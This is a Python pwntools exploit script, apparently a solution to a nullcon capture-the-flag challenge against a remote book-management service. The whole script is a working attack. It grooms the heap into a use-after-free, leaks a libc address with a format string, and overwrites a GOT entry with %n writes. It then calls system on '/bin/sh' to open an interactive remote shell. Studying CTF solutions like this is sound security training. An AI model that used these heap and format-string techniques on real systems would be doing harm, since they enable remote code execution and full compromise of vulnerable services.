from pwn import *

target = remote("pwn.ctf.nullcon.net", 4002)
#target = process('./challenge')
#gdb.attach(target)


# Functions to make / delete books
def addBook(size, price, payload):
    target.sendline('1')
    target.sendline(str(size))
    target.send(payload)
    target.sendline(str(price))
    print target.recvuntil('>')

# I had to send a little bit more for books with names that contain a null byte
def addBookSpc(size, price, payload):
	target.sendline("1")
	target.sendline(str(size))
	target.sendline(payload)
	target.sendline(str(price))
	raw_input()
	target.sendline("7")
	target.recvuntil(">")

    
def deleteBook(index):
    target.sendline('2')
    target.sendline(str(index))
    target.recvuntil('>')


# Add then delete books to setup the use after free
addBook(50, 5, "0"*50)
addBook(50, 5, "1"*50)
addBook(50, 5, "2"*50)
addBook(50, 5, "3"*50)
addBook(50, 5, "4"*50)
addBook(50, 5, "5"*50)
addBook(50, 5, "6"*50)
addBookSpc(50, 5, "/bin/sh\x00") # This is so we will have a pointer to "/bin/sh"
addBook(50, 5, "8"*50)
addBook(50, 5, "9"*50)
addBook(50, 5, "x"*50)
addBook(50, 5, "y"*50)
addBook(50, 5, "9"*50)
addBook(50, 5, "q"*50)

deleteBook(13)
deleteBook(12)
deleteBook(11)
deleteBook(10)
deleteBook(9)
deleteBook(8)
deleteBook(7)
deleteBook(6)
deleteBook(5)
deleteBook(4)
deleteBook(3)
deleteBook(2)
deleteBook(1)
deleteBook(0)


# Add the book for the libc infoleak
addBook(50, 5, "/bin/sh\x00" + p64(0x602028) + "z"*8 + "%7$lx.")

# View the books, and filter out the libc infoleak
target.sendline('3')

for i in xrange(75):
    print target.recvline()

leak = target.recvline()

leak = leak.replace('"name": "', '')
leak = leak.replace('",', '')
leak = leak.replace("\x0a", "")

leak = leak.replace("\"", "")
leak = leak[3:]


leak = u64(leak + "\x00"*(8 - len(leak)))

# subtract the difference between puts and system to get the address of system

leak = leak - 0x31580

print "leak is: " + hex(leak)


# Do a bit of binary math to get the two byte pairs
part0 = str(leak & 0xffff)
part1 = str(((leak & 0xffff0000) >> 16)) 
part2 = str(((leak & 0xffff00000000) >> 32))


print "part 0: " + hex(int(part0))
print "part 1: " + hex(int(part1))
print "part 2: " + hex(int(part2))


# Add the books to do the format string writes
addBookSpc("50", "5", p64(0x60201a) + p64(0x602028) + "z"*8 + "%" + part1 + "x%7$n")
addBookSpc("50", "5", p64(0x60201c) + p64(0x602028) + "z"*8 + "%" + part2 + "x%7$n")
addBookSpc("50", "5", p64(0x602018) + p64(0x602028) + "z"*8 + "%" + part0 + "x%7$n")

# View the books to issue the format string write
target.sendline('3')

# Add some books, so we can remove the book with "/bin/sh"
for i in xrange(10):
	addBookSpc(50, 5, "/bin/sh\x00")

# Delete the book with "/bin/sh" to pass it to system
target.sendline('2')

target.sendline('7')

# Drop to an interactive shell
target.interactive()

